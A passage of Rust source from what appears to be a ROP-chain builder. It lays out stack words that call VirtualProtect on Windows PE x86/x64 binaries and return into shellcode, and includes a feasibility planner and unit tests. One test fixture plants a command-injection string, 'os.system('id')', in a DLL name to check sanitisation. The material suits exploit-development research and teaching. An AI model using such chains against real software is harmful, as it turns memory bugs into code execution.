        b.data(value, format!("{comment} (via rax fallback)"));
        b.padding(pop_rax, &as_refs);
        b.gadget(mov);
        b.padding(mov, &as_refs);
        already_set.push((reg.to_string(), value));
        return Ok(());
    }
    Err(ChainError::MissingGadget(format!(
        "cannot populate {reg}: no 'pop {reg}' gadget and no 'pop rax' + 'mov {reg}, rax' fallback \
         (see tests/spike-report.md — this is the common case on real PEs)"
    )))
}

/// Make the next word land at the index the declared chain base requires,
/// and return that index.
///
/// **CHWIN-01.** The pre-v0.5 version pushed an inert `WordKind::Padding`
/// word holding `0x4141414141414141` here, with the comment "stack
/// alignment word". In a ret-chain there is no filler the machine steps
/// over: every stack word is either taken by an explicit `pop` or loaded
/// into rip by a `ret`, and `clean_tail` guarantees the preceding argument
/// gadget ends in a bare `ret` whose operand is exactly this word. The
/// emulator watched the resulting chain die ten instructions in, at
/// `0x4141414141414141`, before VirtualProtect was ever entered.
///
/// A one-word alignment slide has to be a gadget that consumes itself: the
/// address of a bare `ret`, which loads itself into rip and advances rsp by
/// one word. That is the only construction with the right effect, so when
/// the binary has no bare `ret` gadget the builder says so rather than
/// falling back to a word that kills the chain.
///
/// `body_base` is the first index of the chain BODY: with a `--pivot`
/// prologue the parity is measured from the pivot target, not from word 0.
fn align_for_transfer(
    b: &mut ChainBuilder,
    rev: &[&Gadget],
    parity: ChainBaseParity,
    body_base: usize,
) -> Result<usize, ChainError> {
    if (b.words.len() - body_base) % 2 != parity.transfer_index_parity() {
        let ret = find_exact(rev, "ret").ok_or_else(|| {
            ChainError::MissingGadget(format!(
                "stack alignment (chain base {}): the transfer word must land at an {} index \
                 and needs a one-word slide, which must be a bare `ret` GADGET that consumes \
                 itself — an inert padding word is what the preceding gadget's `ret` would \
                 jump to (CHWIN-01). No bare `ret` gadget in this binary",
                parity.as_str(),
                parity.parity_word()
            ))
        })?;
        b.gadget(ret);
    }
    Ok(b.words.len())
}

/// Does this gadget's tail pop `reg`? On the IAT path a tail `pop rax`
/// overwrites the resolved API address with the padding constant between
/// the dereference and the `jmp rax`.
fn tail_pops(g: &Gadget, reg: &str) -> bool {
    tail(g)
        .iter()
        .any(|insn| insn.strip_prefix("pop ").map(str::trim) == Some(reg))
}

/// The address `name` is exported at by this very image (`CHWIN-08` #3).
///
/// Matched case-insensitively, like every other API-name comparison here,
/// so `--api-name virtualprotect` resolves against `VirtualProtect`.
fn export_addr(exports: &[PeExport], name: &str) -> Option<u64> {
    exports
        .iter()
        .find(|e| e.name.eq_ignore_ascii_case(name))
        .map(|e| e.vaddr)
}

/// The transfer address for `call`, and where it came from.
///
/// Order: (a) the caller's explicit `--api-addr`, because an operator who
/// leaked one knows more than the file does; (b) this image's export table,
/// which needs no leak and no gadgets; (c) the IAT dereference, which needs
/// three gadgets. `None` means "fall through to the IAT".
fn direct_api_addr(call: &ApiCall, opts: &WinChainOpts) -> Option<(u64, &'static str)> {
    if let Some(addr) = call.addr {
        return Some((addr, "--api-addr"));
    }
    export_addr(&opts.exports, &call.name).map(|a| (a, "export table"))
}

/// Find the IAT import for `name`, or say why it cannot be used.
fn iat_import<'i>(imports: &'i [PeImport], name: &str) -> Result<&'i PeImport, ChainError> {
    imports
        .iter()
        .find(|i| i.name.eq_ignore_ascii_case(name))
        .ok_or_else(|| {
            ChainError::MissingGadget(format!(
                "no --api-addr given and the PE does not import {name} \
                 (IAT resolution unavailable); supply --api-addr <runtime address>, or \
                 --api-name <an API this PE does import>"
            ))
        })
}

/// The three gadgets an IAT dereference needs on either width, and the
/// CHWIN-07 rule that none of them may pop the accumulator in its tail.
struct IatRoute<'g> {
    pop: &'g Gadget,
    deref: &'g Gadget,
    jmp: &'g Gadget,
}

fn iat_route<'g>(
    rev: &[&'g Gadget],
    arch: Arch,
    api_name: &str,
) -> Result<IatRoute<'g>, ChainError> {
    let (acc, size) = if arch == Arch::X64 {
        ("rax", "qword")
    } else {
        ("eax", "dword")
    };
    let pop = find_exact(rev, &format!("pop {acc}"))
        .ok_or_else(|| ChainError::MissingGadget(format!("pop {acc} (IAT path)")))?;
    let deref = find_exact(rev, &format!("mov {acc}, {size} ptr [{acc}]"))
        .ok_or_else(|| ChainError::MissingGadget(format!("mov {acc}, [{acc}] (IAT deref)")))?;
    // jmp transfers without consuming a return address; `call` would push
    // one and the API's ret would land there instead of on our
    // second-stack frame — call forms are rejected on purpose.
    let jmp = find_exact(rev, &format!("jmp {acc}"))
        .ok_or_else(|| ChainError::MissingGadget(format!("jmp {acc} (IAT transfer)")))?;
    // Same family as CHWIN-07: a tail `pop <acc>` between the dereference
    // and the transfer replaces the resolved API address with the padding
    // constant. clean_tail permits it, so reject it explicitly.
    for g in [pop, deref] {
        if tail_pops(g, acc) {
            return Err(ChainError::MissingGadget(format!(
                "IAT path: gadget `{}` pops {acc} in its tail, which would overwrite the \
                 resolved {api_name} address with padding before `jmp {acc}` (CHWIN-07)",
                g.text()
            )));
        }
    }
    Ok(IatRoute { pop, deref, jmp })
}

/// The API transfer word: strategy (a) explicit address, strategy (b) IAT
/// dereference (`pop rax ; @iat ; mov rax, [rax] ; jmp rax`). Returns the
/// index of the word whose consumption transfers control to the API (the
/// alignment invariant anchors on it).
///
/// `already_set` is the argument registers populated above and their
/// values (CHWIN-07): the IAT gadgets are chosen by `find_exact`, which
/// permits any tail of `pop`s, so a `pop rax ; pop rcx ; ret` would
/// otherwise refill rcx — arg1 — with `0x4141414141414141` in the last
/// words before the call. `ChainBuilder::padding` already knows how to
/// re-supply a live value; it just has to be told what is live.
#[allow(clippy::too_many_arguments)]
fn emit_api_call64(
    b: &mut ChainBuilder,
    rev: &[&Gadget],
    imports: &[PeImport],
    call: &ApiCall,
    opts: &WinChainOpts,
    parity: ChainBaseParity,
    body_base: usize,
    already_set: &[(String, u64)],
) -> Result<usize, ChainError> {
    let as_refs: Vec<(&str, u64)> = already_set.iter().map(|(r, v)| (r.as_str(), *v)).collect();
    if let Some((addr, how)) = direct_api_addr(call, opts) {
        let idx = align_for_transfer(b, rev, parity, body_base)?;
        b.words.push(ChainWord {
            value: addr,
            kind: WordKind::CodeAddr,
            comment: format!("{} @ {addr:#x} ({how})", call.name),
            source_gadget: None,
        });
        return Ok(idx);
    }
    // Strategy (b): the PE must import the API. Which API that is comes
    // from --api-name (CHWIN-06); the shipped cmd.exe fixtures import
    // VirtualAlloc, not VirtualProtect.
    let imp = iat_import(imports, &call.name)?;
    let route = iat_route(rev, Arch::X64, &call.name)?;

    b.gadget(route.pop);
    // ROB-01: `imp.dll` is copied verbatim out of the PE import descriptor
    // (rf-core pe.rs) — sanitise it here as well as at render time so the
    // IR (and its JSON form) never carries attacker-controlled control
    // characters either.
    // CHWIN-03: `iat_slot_vaddr`, not the IMAGE_IMPORT_BY_NAME record. The
    // deref below reads a pointer-sized cell; the old value pointed at the
    // hint + name string, so `mov rax, [rax]` loaded eight bytes of ASCII.
    b.data(
        imp.iat_slot_vaddr,
        format!("@ IAT {} ({})", call.name, py_comment(&imp.dll)),
    );
    b.padding(route.pop, &as_refs);
    b.gadget(route.deref);
    b.padding(route.deref, &as_refs);
    let idx = align_for_transfer(b, rev, parity, body_base)?;
    b.gadget(route.jmp);
    Ok(idx)
}

/// Win64 builder: register args + alignment + call + second-stack frame,
/// repeated once per composed call (`CHWIN-08` #2).
///
/// Returns the index of every call word, so the alignment invariant can be
/// checked at each of them rather than only at the last.
#[allow(clippy::too_many_arguments)]
fn build_win64(
    b: &mut ChainBuilder,
    gadgets: &[Gadget],
    imports: &[PeImport],
    calls: &[ApiCall],
    shellcode: u64,
    old_protect: u64,
    opts: &WinChainOpts,
    parity: ChainBaseParity,
    body_base: usize,
) -> Result<Vec<usize>, ChainError> {
    /// Win64 shadow space, in words.
    const SHADOW_WORDS: usize = 4;
    let rev: Vec<&Gadget> = gadgets.iter().rev().collect();
    let mut indices = Vec::with_capacity(calls.len());
    for (i, call) in calls.iter().enumerate() {
        let last = i + 1 == calls.len();
        let mut already_set: Vec<(String, u64)> = Vec::new();
        for (reg, value, comment) in win64_args(call.recipe, opts, shellcode, old_protect) {
            set_arg64(b, &rev, reg, value, &comment, &mut already_set)?;
        }

        // The transfer word must land at the index the declared chain base
        // requires; emit_api_call64 slides with a bare `ret` gadget when it
        // does not (CHWIN-01) and returns that index.
        let call_index = emit_api_call64(
            b,
            &rev,
            imports,
            call,
            opts,
            parity,
            body_base,
            &already_set,
        )?;
        indices.push(call_index);

        // Second-stack frame: the API's own ret consumes this word.
        if last {
            b.words.push(ChainWord {
                value: shellcode,
                kind: WordKind::CodeAddr,
                comment: "return address: shellcode (second-stack frame)".to_string(),
                source_gadget: None,
            });
        } else {
            // CHWIN-08 #2: the API must return INTO the chain, and the
            // chain's runtime address is exactly what an exploit does not
            // know. A stack-adjust gadget discards the shadow space and
            // its own `ret` picks the chain up at the next word — no
            // absolute address anywhere.
            let adjust = stack_adjust(&rev, gadgets, Arch::X64, SHADOW_WORDS).ok_or_else(|| {
                ChainError::MissingGadget(format!(
                    "multi-call composition needs a gadget that discards the {SHADOW_WORDS} \
                     shadow-space words and returns (`add rsp, {:#x} ; ret`, or any gadget \
                     with exactly {SHADOW_WORDS} pop slots and a bare `ret`), so \
                     {} can return into the chain",
                    SHADOW_WORDS * 8,
                    call.name
                ))
            })?;
            b.gadget(adjust);
        }
        // 32-byte Win64 shadow space.
        for _ in 0..SHADOW_WORDS {
            b.words.push(ChainWord {
                value: PADDING64,
                kind: WordKind::Padding,
                comment: "shadow space (Win64 ABI)".to_string(),
                source_gadget: None,
            });
        }
    }
    Ok(indices)
}

/// Win32 (stdcall) builder: everything lives on the stack; no register
/// pops are needed for the arguments.
///
/// `CHWIN-08` #4: the x86 IAT dereference, which the pre-v0.5 builder
/// refused with "not implemented". It is the same shape as the x64 one --
/// `pop eax ; @iat ; mov eax, [eax] ; jmp eax` -- and because `jmp` pushes
/// nothing, esp at the API's entry points straight at the stdcall frame the
/// chain lays down next.
///
/// stdcall callees clean up their own arguments (`ret 0x10`), so composing
/// a second call needs no stack-adjust gadget: the non-final return address
/// is a bare `ret` gadget, whose own `ret` reads the next chain word.
#[allow(clippy::too_many_arguments)]
fn build_win32(
    b: &mut ChainBuilder,
    rev: &[&Gadget],
    imports: &[PeImport],
    calls: &[ApiCall],
    shellcode: u64,
    old_protect: u64,
    opts: &WinChainOpts,
) -> Result<Vec<usize>, ChainError> {
    let mut indices = Vec::with_capacity(calls.len());
    for (i, call) in calls.iter().enumerate() {
        let last = i + 1 == calls.len();
        let call_index = match direct_api_addr(call, opts) {
            Some((api, how)) => {
                let idx = b.words.len();
                b.words.push(ChainWord {
                    value: api,
                    kind: WordKind::CodeAddr,
                    comment: format!("{} @ {api:#x} ({how})", call.name),
                    source_gadget: None,
                });
                idx
            }
            None => {
                let imp = iat_import(imports, &call.name)?;
                let route = iat_route(rev, Arch::X86, &call.name)?;
                b.gadget(route.pop);
                b.data(
                    imp.iat_slot_vaddr,
                    format!("@ IAT {} ({})", call.name, py_comment(&imp.dll)),
                );
                b.padding(route.pop, &[]);
                b.gadget(route.deref);
                b.padding(route.deref, &[]);
                let idx = b.words.len();
                b.gadget(route.jmp);
                idx
            }
        };
        indices.push(call_index);
        if last {
            b.words.push(ChainWord {
                value: shellcode,
                kind: WordKind::CodeAddr,
                comment: "stdcall return: shellcode (second-stack frame; ret 0x10 lands here)"
                    .to_string(),
                source_gadget: None,
            });
        } else {
            let ret = find_exact(rev, "ret").ok_or_else(|| {
                ChainError::MissingGadget(
                    "multi-call composition needs a bare `ret` gadget as the non-final stdcall \
                     return address, so the callee's `ret 0x10` lands on a word that resumes \
                     the chain"
                        .to_string(),
                )
            })?;
            b.gadget(ret);
        }
        // CHWIN-02 applies here too: build_win32 used to be handed the
        // writable section's vaddr for BOTH the shellcode home and
        // &lpflOldProtect, and that is reproducible end to end on the
        // shipped pe-x86-cmd fixture.
        for (value, comment) in win32_args(call.recipe, opts, shellcode, old_protect) {
            b.words.push(ChainWord {
                value,
                kind: WordKind::DataAddr,
                comment,
                source_gadget: None,
            });
        }
    }
    Ok(indices)
}

// ---------------------------------------------------------------------------
// ECO-04: the Windows feasibility probe
// ---------------------------------------------------------------------------

/// `ECO-04`: the feasibility report for `windows-virtualprotect`. Never
/// fails — an unsupported target, a missing register or an unresolvable API
/// are all *results*.
///
/// The requirement ids are the ones the exit criterion names: `set_rcx`,
/// `set_rdx`, `set_r8`, `set_r9`, plus `api_transfer`, `stack_align` and
/// `write_target`. They are derived from the SAME `win64_args` table the
/// builder calls, so an argument recipe change cannot leave the plan behind.
pub fn plan_windows(
    gadgets: &[Gadget],
    data_sections: &[DataSection],
    imports: &[PeImport],
    arch: Arch,
    format: &str,
    opts: &WinChainOpts,
    badbytes: &[u8],
) -> ChainPlan {
    let mut pb = PlanBuilder::new(ChainPlan::new(
        "windows-virtualprotect",
        arch_name(arch),
        format,
    ));
    if format != "pe" || !matches!(arch, Arch::X86 | Arch::X64) {
        pb.require(
            "target_supported",
            format!(
                "the Windows chain builder covers PE x86 and x86-64; this is {} / {format}",
                arch_name(arch)
            ),
            Vec::new(),
            None,
        );
        pb.plan.error = Some(
            ChainError::Unsupported {
                arch: arch_name(arch),
                format: format.to_string(),
            }
            .to_string(),
        );
        return pb.plan;
    }
    pb.plan.assumptions.chain_base_parity =
        (arch == Arch::X64).then(|| opts.chain_base.as_str().to_string());

    let recipe = match api_recipe(opts) {
        Ok(r) => r,
        Err(e) => {
            pb.require(
                "api_recipe",
                format!(
                    "an argument recipe for {:?}; this builder models {}",
                    opts.api_name,
                    ApiRecipe::NAMES.join(" and ")
                ),
                Vec::new(),
                None,
            );
            pb.plan.error = Some(e.to_string());
            return pb.plan;
        }
    };

    let writable = pick_writable(data_sections);
    pb.require(
        "write_target",
        "a writable section for the shellcode home and, on the VirtualProtect \
         recipe, a distinct &lpflOldProtect scratch DWORD (CHWIN-02)"
            .to_string(),
        vec![Strategy::new(
            "section: writable",
            data_sections.iter().filter(|s| s.writable).count(),
            "writable non-executable sections in this image",
        )],
        writable.as_ref().ok().map(|s| (s.vaddr, s.name.clone())),
    );
    let Ok(_) = writable else {
        pb.plan.error = Some(ChainError::NoWritableSection.to_string());
        return pb.plan;
    };
    let (shellcode, old_protect) = match resolve_addresses(data_sections, arch, opts) {
        Ok(v) => v,
        Err(e) => {
            pb.plan.error = Some(e.to_string());
            return pb.plan;
        }
    };
    pb.plan.assumptions.write_target = Some(format!("shellcode @ {shellcode:#x}"));

    let rev: Vec<&Gadget> = gadgets.iter().rev().collect();

    if arch == Arch::X64 {
        for (reg, value, comment) in win64_args(recipe, opts, shellcode, old_protect) {
            let direct = find_exact(&rev, &format!("pop {reg}"));
            let via_rax =
                find_exact(&rev, "pop rax").and(find_exact(&rev, &format!("mov {reg}, rax")));
            let n_direct = count_exact(&rev, &format!("pop {reg}"));
            let n_mov = count_exact(&rev, &format!("mov {reg}, rax"));
            let n_pop_rax = count_exact(&rev, "pop rax");
            pb.require(
                &format!("set_{reg}"),
                format!("{reg} must hold {value:#x} — {comment}"),
                vec![
                    Strategy::new(
                        format!("pop {reg}"),
                        n_direct,
                        format!(
                            "a clean-tailed `pop {reg}` (ropmaker's __lookingForSomeThing rule)"
                        ),
                    ),
                    Strategy::new(
                        format!("pop rax ; mov {reg}, rax"),
                        if n_pop_rax == 0 { 0 } else { n_mov },
                        format!(
                            "route the value through rax; counts the `mov {reg}, rax` half, \
                             and is 0 when there is no clean `pop rax` to pair it with \
                             (this scan has {n_pop_rax})"
                        ),
                    ),
                ],
                direct.or(via_rax).map(|g| (g.vaddr, g.text())),
            );
        }
        let ret = find_exact(&rev, "ret");
        pb.require(
            "stack_align",
            format!(
                "a bare `ret` gadget for the one-word alignment slide — an inert padding \
                 word is what the preceding `ret` would jump to (CHWIN-01). Chain base \
                 parity: {}",
                opts.chain_base.as_str()
            ),
            vec![Strategy::new(
                "ret",
                count_exact(&rev, "ret"),
                "bare `ret` gadgets (a one-word slide that consumes itself)",
            )],
            ret.map(|g| (g.vaddr, g.text())),
        );
    }

    // The API transfer: an explicit address, an IAT dereference, or (x64,
    // x86) an export-table entry when the image exports it itself.
    let mut strategies = vec![
        Strategy::new(
            "--api-addr",
            usize::from(opts.api_addr.is_some()),
            "a runtime address supplied by the caller (needs an information leak)",
        ),
        Strategy::new(
            format!("export table[{}]", opts.api_name),
            usize::from(export_addr(&opts.exports, &opts.api_name).is_some()),
            format!(
                "this image's own export directory (no leak, no gadgets); it exports {} \
                 symbols",
                opts.exports.len()
            ),
        ),
    ];
    let imported = imports
        .iter()
        .find(|i| i.name.eq_ignore_ascii_case(&opts.api_name));
    strategies.push(Strategy::new(
        format!("IAT[{}]", opts.api_name),
        usize::from(imported.is_some()),
        format!(
            "the PE's own import of {} (no leak needed); this image imports {} functions",
            opts.api_name,
            imports.len()
        ),
    ));
    let hit = if let Some(addr) = opts.api_addr {
        pb.plan.assumptions.needs_leak = true;
        Some((0u64, format!("--api-addr {addr:#x}")))
    } else if let Some(addr) = export_addr(&opts.exports, &opts.api_name) {
        Some((0u64, format!("export table {} @ {addr:#x}", opts.api_name)))
    } else if arch == Arch::X64 {
        // The x64 IAT route also needs three gadgets.
        let pop_rax = find_exact(&rev, "pop rax");
        let deref = find_exact(&rev, "mov rax, qword ptr [rax]");
        let jmp = find_exact(&rev, "jmp rax");
        strategies.push(Strategy::new(
            "pop rax ; mov rax, qword ptr [rax] ; jmp rax",
            [
                count_exact(&rev, "pop rax"),
                count_exact(&rev, "mov rax, qword ptr [rax]"),
                count_exact(&rev, "jmp rax"),
            ]
            .into_iter()
            .min()
            .unwrap_or(0),
            "the three gadgets the IAT dereference needs, counted at the scarcest of them",
        ));
        imported
            .zip(pop_rax.and(deref).and(jmp))
            .map(|(i, _)| (i.iat_slot_vaddr, format!("IAT slot for {}", opts.api_name)))
    } else {
        // x86 (CHWIN-08): `mov eax, dword ptr [eax] ; ... ; jmp eax`.
        let pop_eax = find_exact(&rev, "pop eax");
        let deref = find_exact(&rev, "mov eax, dword ptr [eax]");
        let jmp = find_exact(&rev, "jmp eax");
        strategies.push(Strategy::new(
            "pop eax ; mov eax, dword ptr [eax] ; jmp eax",
            [
                count_exact(&rev, "pop eax"),
                count_exact(&rev, "mov eax, dword ptr [eax]"),
                count_exact(&rev, "jmp eax"),
            ]
            .into_iter()
            .min()
            .unwrap_or(0),
            "the three gadgets the x86 IAT dereference needs (CHWIN-08)",
        ));
        imported
            .zip(pop_eax.and(deref).and(jmp))
            .map(|(i, _)| (i.iat_slot_vaddr, format!("IAT slot for {}", opts.api_name)))
    };
    if hit.is_none() {
        pb.plan.assumptions.needs_leak = true;
    }
    pb.require(
        "api_transfer",
        format!(
            "control must reach {} — by an explicit runtime address or by dereferencing \
             the PE's own import table",
            opts.api_name
        ),
        strategies,
        hit,
    );

    match build_windows_virtualprotect(
        gadgets,
        data_sections,
        imports,
        arch,
        format,
        opts,
        badbytes,
    ) {
        Ok(chain) => {
            pb.plan.feasible = true;
            pb.plan.word_count = Some(chain.words.len());
        }
        Err(e) => pb.plan.error = Some(e.to_string()),
    }
    pb.plan
}

#[cfg(test)]
mod tests {
    use super::*;
    use crate::ChainInvariant;

    fn gadget(vaddr: u64, text: &str) -> Gadget {
        Gadget {
            vaddr,
            bytes: Vec::new(),
            insns: text.split(" ; ").map(|s| s.to_string()).collect(),
            delay_slot: false,
            prev: None,
            table: rf_scan::TableKind::Rop,
        }
    }

    /// The ntoskrnl-style full-pop set (spike: pop rcx/rdx/r8/r9 exist).
    ///
    /// The bare `ret` at the end is not decoration: since CHWIN-01 the
    /// one-word alignment slide is a real gadget the preceding `ret` lands
    /// on, so a binary with no bare `ret` cannot be aligned at all. Every
    /// real PE has one (`ret` is the last byte of every ret-terminated
    /// gadget); the shipped cmd.exe fixtures report exactly one each.
    fn win64_pop_set() -> Vec<Gadget> {
        vec![
            gadget(0x1000, "pop rcx ; ret"),
            gadget(0x1010, "pop rdx ; ret"),
            gadget(0x1020, "pop r8 ; ret"),
            gadget(0x1030, "pop r9 ; ret"),
            gadget(0x1040, "pop rax ; ret"),
            gadget(0x1050, "mov rax, qword ptr [rax] ; ret"),
            gadget(0x1060, "jmp rax"),
            gadget(0x1070, "ret"),
        ]
    }

    /// cmd.exe-style scarcity: only rcx pops; rdx/r8/r9 need the rax
    /// fallback (mov rX, rax present for rdx/r8 only → r9 must fail).
    fn win64_fallback_set() -> Vec<Gadget> {
        vec![
            gadget(0x1000, "pop rcx ; ret"),
            gadget(0x1040, "pop rax ; ret"),
            gadget(0x1070, "mov rdx, rax ; ret"),
            gadget(0x1080, "mov r8, rax ; ret"),
            gadget(0x10a0, "ret"),
            // no r9 route at all
        ]
    }

    /// CHWIN-07's shape: the IAT `pop rax` carries a second pop, which is
    /// legal under `clean_tail` and common in real PEs.
    fn win64_iat_extra_pop_set() -> Vec<Gadget> {
        vec![
            gadget(0x1000, "pop rcx ; ret"),
            gadget(0x1010, "pop rdx ; ret"),
            gadget(0x1020, "pop r8 ; ret"),
            gadget(0x1030, "pop r9 ; ret"),
            gadget(0x1040, "pop rax ; pop rcx ; ret"),
            gadget(0x1050, "mov rax, qword ptr [rax] ; ret"),
            gadget(0x1060, "jmp rax"),
            gadget(0x1070, "ret"),
        ]
    }

    fn data() -> Vec<DataSection> {
        vec![DataSection {
            name: ".data".into(),
            vaddr: 0x500000,
            writable: true,
        }]
    }

    /// Two writable sections: the CHWIN-02 scratch can then be a section
    /// the protected region does not cover.
    fn data_two_writable() -> Vec<DataSection> {
        vec![
            DataSection {
                name: ".data".into(),
                vaddr: 0x500000,
                writable: true,
            },
            DataSection {
                name: ".scratch".into(),
                vaddr: 0x600000,
                writable: true,
            },
        ]
    }

    fn import_named(name: &str) -> Vec<PeImport> {
        vec![PeImport {
            dll: "KERNEL32.dll".into(),
            name: name.into(),
            // CHWIN-03: the IAT slot the loader patches (8-byte aligned
            // pointer cell), not the IMAGE_IMPORT_BY_NAME record.
            iat_slot_rva: 0x2000,
            iat_slot_vaddr: 0x502000,
            hint_name_rva: 0x3000,
            hint_name_vaddr: 0x503000,
        }]
    }

    fn vp_import() -> Vec<PeImport> {
        import_named("VirtualProtect")
    }

    /// ROB-01: what `rf-core`'s PE loader hands us when the import
    /// descriptor's Name RVA points at attacker-chosen bytes — the DLL
    /// name is copied verbatim, newlines included.
    fn poisoned_import() -> Vec<PeImport> {
        vec![PeImport {
            dll: "KERNEL32\nimport os\nos.system('id')\n.dll".into(),
            name: "VirtualProtect".into(),
            iat_slot_rva: 0x2000,
            iat_slot_vaddr: 0x502000,
            hint_name_rva: 0x3000,
            hint_name_vaddr: 0x503000,
        }]
    }

    fn opts_with_api() -> WinChainOpts {
        WinChainOpts {
            api_addr: Some(0x7fff_1234_0000),
            ..WinChainOpts::default()
        }
    }

    /// The index of the word whose consumption enters the API.
    fn transfer_index(chain: &RopChain) -> usize {
        chain
            .words
            .iter()
            .position(|w| w.comment.contains("--api-addr") || w.comment == "jmp rax")
            .expect("a transfer word")
    }

    #[test]
    fn win64_pop_chain_layout_and_alignment() {
        let g = win64_pop_set();
        let chain =
            build_windows_virtualprotect(&g, &data(), &[], Arch::X64, "pe", &opts_with_api(), &[])
                .unwrap();
        assert_eq!(chain.word_size, 8);
        let kinds: Vec<WordKind> = chain.words.iter().map(|w| w.kind).collect();
        // 4×(gadget+value) = 8 words; the DEFAULT chain base is
        // `return_address` (CHWIN-04), which needs the transfer word at an
        // ODD index, so a one-word `ret` slide lands at 8 and the transfer
        // at 9. Then return-to-shellcode + 4 shadow words.
        assert_eq!(
            kinds,
            vec![
                WordKind::GadgetAddr,
                WordKind::DataAddr,
                WordKind::GadgetAddr,
                WordKind::DataAddr,
                WordKind::GadgetAddr,
                WordKind::DataAddr,
                WordKind::GadgetAddr,
                WordKind::DataAddr,
                WordKind::GadgetAddr, // CHWIN-01: a bare `ret`, not a pad
                WordKind::CodeAddr,   // VirtualProtect @ 0x7fff12340000
                WordKind::CodeAddr,   // return: shellcode
                WordKind::Padding,
                WordKind::Padding,
                WordKind::Padding,
                WordKind::Padding,
            ]
        );
        assert_eq!(chain.words[1].value, 0x500000); // lpAddress = .data default
        assert_eq!(chain.words[3].value, 0x1000); // dwSize
        assert_eq!(chain.words[5].value, 0x40); // flNewProtect
        assert_eq!(chain.words[7].value, 0x500ff8); // lpflOldProtect scratch
        assert_eq!(chain.words[9].value, 0x7fff_1234_0000);
        assert!(chain.words[9].comment.contains("--api-addr"));
        assert_eq!(chain.words[10].value, 0x500000); // return → shellcode
    }

    /// CHWIN-01. The one-word stack-alignment slide must be the ADDRESS OF
    /// A BARE `ret` GADGET, because that is the only word the preceding
    /// gadget's `ret` can land on and survive. The pre-v0.5 builder pushed
    /// an inert `0x4141414141414141` `Padding` word here and the emulator
    /// watched the chain transfer control straight to it.
    #[test]
    fn win64_alignment_slide_is_a_bare_ret_gadget_not_a_data_word() {
        let g = win64_pop_set();
        let chain =
            build_windows_virtualprotect(&g, &data(), &[], Arch::X64, "pe", &opts_with_api(), &[])
                .unwrap();
        let call_idx = transfer_index(&chain);
        assert_eq!(call_idx % 2, 1, "return_address base wants an odd index");
        let slide = &chain.words[call_idx - 1];
        assert_eq!(
            slide.kind,
            WordKind::GadgetAddr,
            "the slide word is what the previous `ret` jumps to; a data word is a crash"
        );
        assert_ne!(slide.value, PADDING64);
        let gref = &chain.gadgets[slide.source_gadget.expect("slide has a source gadget")];
        assert_eq!(gref.text, "ret", "the slide must consume itself");
        assert_eq!(gref.vaddr, 0x1070);
        // And no data word anywhere is in control position: the static
        // accounting walk (CHLX-04) is what proves that, so run it.
        let acct = chain.verify_stack_accounting().unwrap();
        assert_eq!(acct.roles[call_idx - 1], crate::WordRole::ControlTransfer);
        assert!(acct.words_verified() >= call_idx);
    }

    /// The mirror image: when the argument gadgets already land the
    /// transfer word on the right parity, no slide is emitted at all.
    #[test]
    fn win64_alignment_emits_no_slide_when_the_parity_already_holds() {
        // `pop r9 ; pop rbx ; ret` adds one tail padding word, making the
        // pre-transfer word count ODD — which is what `return_address`
        // wants.
        let mut g = win64_pop_set();
        g[3] = gadget(0x1030, "pop r9 ; pop rbx ; ret");
        let chain =
            build_windows_virtualprotect(&g, &data(), &[], Arch::X64, "pe", &opts_with_api(), &[])
                .unwrap();
        let call_idx = transfer_index(&chain);
        assert_eq!(call_idx, 9);
        assert_eq!(chain.words[call_idx - 1].kind, WordKind::Padding);
        assert!(chain.words[call_idx - 1].comment.contains("padding"));
        assert!(
            !chain.gadgets.iter().any(|gr| gr.text == "ret"),
            "no slide was needed, so no bare `ret` should be referenced"
        );
    }

    /// CHWIN-01, the refusal half: with no bare `ret` gadget there is no
    /// legal way to slide one word, and the builder says so instead of
    /// reaching for a data word.
    #[test]
    fn win64_alignment_without_a_bare_ret_gadget_is_refused() {
        let g: Vec<Gadget> = win64_pop_set()
            .into_iter()
            .filter(|g| g.text() != "ret")
            .collect();
        let err =
            build_windows_virtualprotect(&g, &data(), &[], Arch::X64, "pe", &opts_with_api(), &[])
                .unwrap_err();
        let msg = err.to_string();
        assert!(msg.contains("CHWIN-01"), "{msg}");
        assert!(msg.contains("bare `ret`"), "{msg}");
        assert!(msg.contains("odd index"), "{msg}");
    }

    /// CHWIN-04. The chain base is a parameter, and it changes the layout:
    /// the same gadgets produce a transfer word at an EVEN index for an
    /// aligned base and an ODD one for a saved return address.
    #[test]
    fn win64_chain_base_parity_moves_the_transfer_word() {
        let g = win64_pop_set();
        let aligned = build_windows_virtualprotect(
            &g,
            &data(),
            &[],
            Arch::X64,
            "pe",
            &WinChainOpts {
                chain_base: ChainBaseParity::Aligned,
                ..opts_with_api()
            },
            &[],
        )
        .unwrap();
        let retaddr =
            build_windows_virtualprotect(&g, &data(), &[], Arch::X64, "pe", &opts_with_api(), &[])
                .unwrap();
        assert_eq!(transfer_index(&aligned) % 2, 0);
        assert_eq!(transfer_index(&retaddr) % 2, 1);
        assert_eq!(transfer_index(&aligned) + 1, transfer_index(&retaddr));
        // Both satisfy the ABI under THEIR OWN declared base…
        assert_eq!(
            ChainBaseParity::Aligned.entry_rsp_mod16(transfer_index(&aligned)),
            8
        );
        assert_eq!(
            ChainBaseParity::ReturnAddress.entry_rsp_mod16(transfer_index(&retaddr)),
            8
        );
        // …and neither satisfies it under the other one. That is the whole
        // finding: the pre-v0.5 builder had no way to be told which is real.
        assert_eq!(
            ChainBaseParity::ReturnAddress.entry_rsp_mod16(transfer_index(&aligned)),
            0
        );
    }

    /// CHWIN-04, the validation half: the invariant is checked *against*
    /// the declared base, and rejects a chain laid out for the other one.
    #[test]
    fn win64_alignment_invariant_is_checked_against_the_declared_base() {
        let g = win64_pop_set();
        let aligned_opts = WinChainOpts {
            chain_base: ChainBaseParity::Aligned,
            ..opts_with_api()
        };
        let chain =
            build_windows_virtualprotect(&g, &data(), &[], Arch::X64, "pe", &aligned_opts, &[])
                .unwrap();
        let universe = RopChain::universe_from(&g);
        let call_idx = transfer_index(&chain);
        // The base it was built for accepts it…
        let ok_hook: ChainInvariant = &|c: &RopChain| {
            let j = c
                .words
                .iter()
                .position(|w| w.comment.contains("--api-addr"))
                .unwrap();
            if ChainBaseParity::Aligned.entry_rsp_mod16(j) != 8 {
                return Err(ChainError::InvalidWord {
                    index: j,
                    value: c.words[j].value,
                    kind: c.words[j].kind,
                    reason: "misaligned".to_string(),
                });
            }
            Ok(())
        };
        chain.validate_with(&universe, &[], &[ok_hook]).unwrap();
        // …the other base rejects it.
        let bad_hook: ChainInvariant = &|c: &RopChain| {
            let j = c
                .words
                .iter()
                .position(|w| w.comment.contains("--api-addr"))
                .unwrap();
